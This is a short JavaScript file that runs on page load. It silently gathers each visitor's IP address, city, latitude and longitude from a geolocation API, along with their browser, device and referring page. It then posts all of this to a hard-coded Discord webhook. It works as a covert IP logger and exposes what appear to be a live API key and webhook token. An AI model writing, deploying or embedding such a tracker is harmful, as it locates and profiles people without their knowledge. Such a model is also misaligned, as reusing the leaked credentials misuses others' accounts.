function httpGetAsync(url, callback) {
    const xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function () {
        if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
            callback(xmlHttp.responseText);
        }
    };
    xmlHttp.open("GET", url, true); // true for asynchronous
    xmlHttp.send(null);
}

function getUserInfo() {
    const url = "https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e"; // Replace with your API key
    httpGetAsync(url, function (response) {
        const userData = JSON.parse(response);

        // Extract user information (date, day, time, referring URL, browser, and device)
        const date = new Date();
        const day = date.toLocaleDateString();
        const time = date.toLocaleTimeString();
        const referringURL = document.referrer;
        const browser = navigator.userAgent;
        const device = navigator.platform;

        // Construct the message to send to Discord
        const message = `User Info:
Date: ${day}
Time: ${time}
Referring URL: ${referringURL}
Browser: ${browser}
Device: ${device}

IP Geolocation Info:
IP Address: ${userData.ip_address}
Country: ${userData.country}
City: ${userData.city}
Latitude: ${userData.latitude}
Longitude: ${userData.longitude}`;

        // Send the message to Discord using a webhook
        sendToDiscordWebhook(message);
    });
}

function sendToDiscordWebhook(message) {
    const webhookUrl = "https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT"; // Replace with your Discord webhook URL
    const payload = JSON.stringify({ content: message });

    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhookUrl, true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.send(payload);
}

// Call the function to get user info and send it to Discord
getUserInfo();
